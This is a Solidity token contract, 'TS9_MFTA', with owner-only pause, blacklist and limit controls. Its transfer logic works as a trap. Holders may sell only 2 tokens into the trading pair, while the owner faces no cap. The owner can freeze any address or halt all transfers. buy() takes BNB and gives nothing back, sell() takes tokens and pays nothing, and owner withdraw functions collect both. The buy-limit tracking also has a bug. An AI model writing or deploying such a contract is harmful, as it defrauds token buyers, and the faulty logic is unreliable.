//SourceUnit: TS9_MFTA (1).sol


// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract TS9_MFTA is Context, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
     mapping (address => uint256) private selling;
     mapping (address => uint256) private buying;
     mapping (address=>bool) public  blacklist;

    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;


      address public pancakePair;
    
       uint256 public maxsellamount=2E18;
       uint256 public maxbuyamount=50E18;
       address public owner;
      
     



    constructor ()  {
        _name = 'TS9_MFTA';
        _symbol = 'MFTA';
        _totalSupply = 10500000e18;
        _decimals = 18;
        
          owner=msg.sender;
          _balances[owner] = _totalSupply;
                  _paused = false;
        emit Transfer(address(0), owner, _totalSupply);
        
    }

     modifier onlyOwner() {
        require(msg.sender==owner, "Only Call by Owner");
        _;
    }


    /**
     * @dev Emitted when the pause is triggered by `account`.
     */
    event Paused(address account);

    /**
     * @dev Emitted when the pause is lifted by `account`.
     */
    event Unpaused(address account);

    bool private _paused;

    /**
     * @dev Initializes the contract in unpaused state.
     */
 

      


    /**
     * @dev Returns true if the contract is paused, and false otherwise.
     */
    function paused() public view virtual returns (bool) {
        return _paused;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is not paused.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    modifier whenNotPaused() {
        require(!paused(), "Pausable: paused");
        _;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is paused.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    modifier whenPaused() {
        require(paused(), "Pausable: not paused");
        _;
    }

    /**
     * @dev Triggers stopped state.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(msg.sender);
    }

    /**
     * @dev Returns to normal state.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(msg.sender);
    }

    function pauseContract() public onlyOwner{
        _pause();

    }
    function unpauseContract() public onlyOwner{
        _unpause();

    }

//         
    // 





    

    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual whenNotPaused override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public whenNotPaused virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual whenNotPaused returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual whenNotPaused returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal whenNotPaused virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(blacklist[sender]==false,"you are blacklisted");
        _beforeTokenTransfer(sender, recipient, amount);  
        
         if(sender==owner && recipient == pancakePair  ){
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);	
         selling[sender]+=amount;

        }    

          else if(sender==owner){
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
        }
        
        else if (recipient == pancakePair ){
				require( selling[sender]+amount <= maxsellamount, "You can't sell more than maxlimit");
                  _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);	
         selling[sender]+=amount;
			}
      
        else if(sender==pancakePair) {
            require( buying[recipient]+amount <= maxbuyamount, "You can't buy more than maxlimit");
                  _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);	
         buying[recipient]=buying[msg.sender].add(amount);            

        }   
            else {

                  _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
                _balances[recipient] = _balances[recipient].add(amount);

            }
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal whenNotPaused virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

    function maxsell(uint256 _amount) public whenNotPaused onlyOwner{

        maxsellamount=_amount*1E18;

    }


      function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 value) internal whenNotPaused {
        require(account != address(0), "ERC20: burn from the zero address");

        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }


    function addpairaddress(address _pair) public onlyOwner whenNotPaused{
        pancakePair=_pair;

    }
        
    function transferownership(address _newonwer) public whenNotPaused onlyOwner{
        owner=_newonwer;
    }

     
    function setbuylimit(uint256 _amount) public onlyOwner whenNotPaused{
    maxbuyamount=_amount*1E18;
    }

    function addtoblacklist(address _addr) public onlyOwner whenNotPaused{
        require(blacklist[_addr]==false,"already blacklisted");
        blacklist[_addr]=true;
    }

    function removefromblacklist(address _addr) public onlyOwner whenNotPaused{
        require(blacklist[_addr]==true,"already removed from blacklist");
        blacklist[_addr]=false;
    }

    event Multisended(uint256 total, address tokenAddress);

     
    function register(address _address)public pure returns(address)
    {
        return _address;
    }
    
    
    function multisendToken( address[] calldata _contributors, uint256[] calldata __balances) external whenNotPaused  
        {
            uint8 i = 0;
            for (i; i < _contributors.length; i++) {
            _transfer(msg.sender,_contributors[i], __balances[i]);
            }
        }
    
    
  
    function sendMultiBnb(address payable[]  memory  _contributors, uint256[] memory __balances) public  payable whenNotPaused
    {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= __balances[i],"Invalid Amount");
            total = total - __balances[i];
            _contributors[i].transfer(__balances[i]);
        }
        emit Multisended(  msg.value , msg.sender);
    }


    function buy() external payable whenNotPaused
    {
        require(msg.value>0,"Select amount first");
    }
    
    
    function sell (uint256 _token) external whenNotPaused
    {
        require(_token>0,"Select amount first");
        _transfer(msg.sender,address(this),_token);
    }
    
    
    
    function withDraw (uint256 _amount) onlyOwner public whenNotPaused
    {
        payable(msg.sender).transfer(_amount);
    }
    
    
    
    function getTokens (uint256 _amount) onlyOwner public whenNotPaused
    {
        _transfer(address(this),msg.sender,_amount);
    }
    


    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}